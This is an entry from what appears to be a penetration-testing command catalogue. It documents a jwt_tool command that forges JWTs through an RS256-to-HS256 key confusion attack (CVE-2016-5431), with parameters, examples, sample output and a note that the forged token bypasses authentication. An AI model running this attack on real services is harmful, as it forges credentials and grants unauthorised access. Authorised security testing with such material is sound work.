---
id: df7cd741-ca23-4582-a877-964149d345dc
name: jwt-tool-key-confusion-attack
type: command
executor: bash
data: python3 jwt_tool.py $_JWT_TOKEN -X k -pk $_PUBLIC_KEY_PATH
output: null
created_at: '2023-04-06T03:56:00.668050Z'
updated_at: '2023-04-10T20:22:34.906377Z'
platforms:
  - Linux
  - macOS
tags:
  - jwt
  - exploitation
verified: true
validated: true
---

# jwt-tool-key-confusion-attack

## Command

```bash
python3 jwt_tool.py $_JWT_TOKEN -X k -pk $_PUBLIC_KEY_PATH
```

## Description

This command uses the jwt_tool to perform a key confusion attack on a JWT, switching from RS256 to HS256 by signing with the public key as the HMAC secret, exploiting CVE-2016-5431 to forge a valid token.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_JWT_TOKEN | The base64-encoded JWT string to attack | Yes |
| -X k | Execute key confusion attack mode | Yes |
| -pk | Path to the public key file (PEM format) | Yes |
| $_PUBLIC_KEY_PATH | Full path to the public key file (e.g., /path/to/my_public.pem) | Yes |

## Examples

### Basic Usage

```bash
python3 jwt_tool.py eyJhbGciOiJSUzI1NiJ9... -X k -pk ./my_public.pem
```

### Advanced Usage

For verbose output, add -v flag if supported by the tool:

```bash
python3 jwt_tool.py $_JWT_TOKEN -X k -pk $_PUBLIC_KEY_PATH -v
```

## Expected Output

The tool will display the original JWT details, perform the attack, and output the forged JWT:

```
[*] Input token: eyJhbGciOiJSUzI1NiJ9...
[*] Key confusion attack successful.
[*] Forged token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.signature
```

A successful run produces a new JWT with HS256 algorithm that can be used to bypass authentication.

## Related

- [[Related Procedure: jwt-signature-key-confusion-attack-rs256-to-hs256-cve-2016-5431]]
- [[Related Tool: jwt-tool]]
